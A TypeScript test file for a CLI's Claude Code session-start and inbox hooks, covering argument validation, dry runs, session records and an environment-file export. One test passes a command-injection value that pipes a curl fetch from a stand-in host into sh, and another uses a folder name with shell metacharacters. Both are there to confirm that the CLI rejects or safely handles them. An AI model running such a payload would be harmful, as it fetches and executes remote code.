import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { randomUUID } from 'node:crypto';
import { mkdir, mkdtemp, readFile, realpath, rm, stat, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import test from 'node:test';
import { formatCommandOutput, run } from './index.js';
import { readClaudeSessionStart } from './sessionNames.js';

test('hook claude dispatch refuses unknown actions before reading stdin; an empty hook result prints nothing', async () => {
  await assert.rejects(run(['hook', 'claude', 'stop']), /claude_hook_command_invalid/);
  await assert.rejects(run(['hook', 'codex', 'inbox']), /claude_hook_command_invalid/);
  assert.equal(formatCommandOutput(''), '');
});

const pick = (value: unknown, keys: string[]) =>
  Object.fromEntries(keys.map(key => [key, (value as Record<string, unknown>)[key]]));

test('hook claude session-start and inbox accept --dry-run and return a plan without effects (AGENTS.md rule 8, R3)', async () => {
  for (const action of ['session-start', 'inbox']) {
    assert.deepEqual(pick(await run(['hook', 'claude', action, '--dry-run']), ['ok', 'stage', 'effects', 'action']),
      { ok: true, stage: 'plan', effects: false, action });
  }
  await assert.rejects(run(['hook', 'claude', 'inbox', '--yes']), /claude_hook_command_invalid/, 'other flags stay refused');
  await assert.rejects(run(['hook', 'claude', 'inbox', '--session-id', randomUUID()]), /claude_hook_command_invalid/,
    '--session-id is for session-start only');
  const sessionId = randomUUID();
  assert.deepEqual(pick(await run(['hook', 'claude', 'session-start', '--session-id', sessionId, '--dry-run']),
    ['ok', 'stage', 'effects', 'action', 'sessionId']), { ok: true, stage: 'plan', effects: false, action: 'session-start', sessionId });
});

// The SessionStart hook runs at every session start, often beside other plugins' hooks; the official bin answers
// `hook claude session-start` without loading the whole CLI, and a recorded session clears an earlier failure note.
test('dharma hook claude session-start through the official bin records the session and clears its failure note', async () => {
  const home = await mkdtemp(join(tmpdir(), 'dharma-hook-bin-'));
  try {
    const sessionId = randomUUID();
    const note = join(home, 'session-messages', 'claude-session-start-failures', `${sessionId}.json`);
    await mkdir(dirname(note), { recursive: true });
    await writeFile(note, JSON.stringify({ schema: 'dharma.claude-session-start-failure/v1', sessionId, cwd: home,
      at: '2026-11-10T09:00:00.000Z', state: 'pending', reason: 'did_not_finish', recovery: '' }));
    const env: NodeJS.ProcessEnv = { ...process.env, DHARMA_HOME: home };
    delete env.CLAUDE_ENV_FILE;
    delete env.DHARMA_CLAUDE_SESSION_ID;
    const result = spawnSync(process.execPath, [fileURLToPath(new URL('./bin.js', import.meta.url)), 'hook', 'claude', 'session-start'],
      { encoding: 'utf8', input: JSON.stringify({ session_id: sessionId, cwd: home, hook_event_name: 'SessionStart' }), env,
        timeout: 30_000, windowsHide: true });
    assert.deepEqual([result.status, result.stdout], [0, ''], result.stderr);
    assert.equal((await readClaudeSessionStart(home, sessionId))?.cwd, home);
    await assert.rejects(stat(note), /ENOENT/, 'the failure note is gone once the session is recorded');
  } finally { await rm(home, { recursive: true, force: true }); }
});

// The recovery line the hook and attach print: a fixed command and a session id the user can see. The CLI checks the
// id as a UUID and takes the folder from where it runs, so no folder name ever goes inside shell quoting.
test('hook claude session-start --session-id records this folder for a checked UUID without reading stdin', async () => {
  for (const id of ['not-a-uuid', "x';curl example.test|sh;'", '']) {
    await assert.rejects(run(['hook', 'claude', 'session-start', '--session-id', id]), /claude_hook_session_id_invalid|claude_hook_command_invalid/);
  }
  await assert.rejects(run(['hook', 'claude', 'session-start', '--session-id', 'not-a-uuid']), /claude_hook_session_id_invalid/);
  const home = await mkdtemp(join(tmpdir(), 'dharma-hook-recover-'));
  try {
    const folder = join(home, process.platform === 'win32' ? "project '$(x);& é 日本" : 'project \'"$(x);& é 日本');
    await mkdir(folder);
    const sessionId = randomUUID();
    const env: NodeJS.ProcessEnv = { ...process.env, DHARMA_HOME: home };
    delete env.CLAUDE_ENV_FILE;
    delete env.DHARMA_CLAUDE_SESSION_ID;
    const bin = fileURLToPath(new URL('./bin.js', import.meta.url));
    const result = spawnSync(process.execPath, [bin, 'hook', 'claude', 'session-start', '--session-id', sessionId],
      { cwd: folder, encoding: 'utf8', env, timeout: 30_000, windowsHide: true });
    assert.equal(result.status, 0, result.stderr);
    assert.deepEqual(pick(JSON.parse(result.stdout), ['ok', 'stage', 'action', 'sessionId']),
      { ok: true, stage: 'recorded', action: 'session-start', sessionId });
    const record = await readClaudeSessionStart(home, sessionId);
    assert.ok(record);
    assert.equal(await realpath(record.cwd), await realpath(folder));
    const refused = spawnSync(process.execPath, [bin, 'hook', 'claude', 'session-start', '--session-id', 'not-a-uuid'],
      { cwd: folder, encoding: 'utf8', env, timeout: 30_000, windowsHide: true });
    assert.equal(refused.status, 2);
    assert.match(refused.stderr, /claude_hook_session_id_invalid/);
    assert.equal(refused.stdout, '');
  } finally { await rm(home, { recursive: true, force: true }); }
});

// On Windows an antivirus scan or the indexer can hold the note just written, so removing it fails with EPERM or
// EBUSY. That must never cost the CLAUDE_ENV_FILE export, which is how later Bash calls know their own session.
test('session-start exports the session id to CLAUDE_ENV_FILE even when its failure note cannot be removed', async () => {
  const home = await mkdtemp(join(tmpdir(), 'dharma-hook-export-'));
  try {
    const sessionId = randomUUID();
    // A non-empty directory where the note would be: removing it fails, as a held file does.
    const note = join(home, 'session-messages', 'claude-session-start-failures', `${sessionId}.json`);
    await mkdir(note, { recursive: true });
    await writeFile(join(note, 'held'), '');
    const envFile = join(home, 'claude-env');
    const env: NodeJS.ProcessEnv = { ...process.env, DHARMA_HOME: home, CLAUDE_ENV_FILE: envFile };
    delete env.DHARMA_CLAUDE_SESSION_ID;
    const result = spawnSync(process.execPath, [fileURLToPath(new URL('./bin.js', import.meta.url)), 'hook', 'claude', 'session-start'],
      { encoding: 'utf8', input: JSON.stringify({ session_id: sessionId, cwd: home, hook_event_name: 'SessionStart', source: 'startup' }),
        env, timeout: 30_000, windowsHide: true });
    assert.deepEqual([result.status, result.stdout], [0, ''], result.stderr);
    assert.equal((await readClaudeSessionStart(home, sessionId))?.cwd, home);
    assert.equal(await readFile(envFile, 'utf8'), `export DHARMA_CLAUDE_SESSION_ID=${sessionId}\n`);
  } finally { await rm(home, { recursive: true, force: true }); }
});
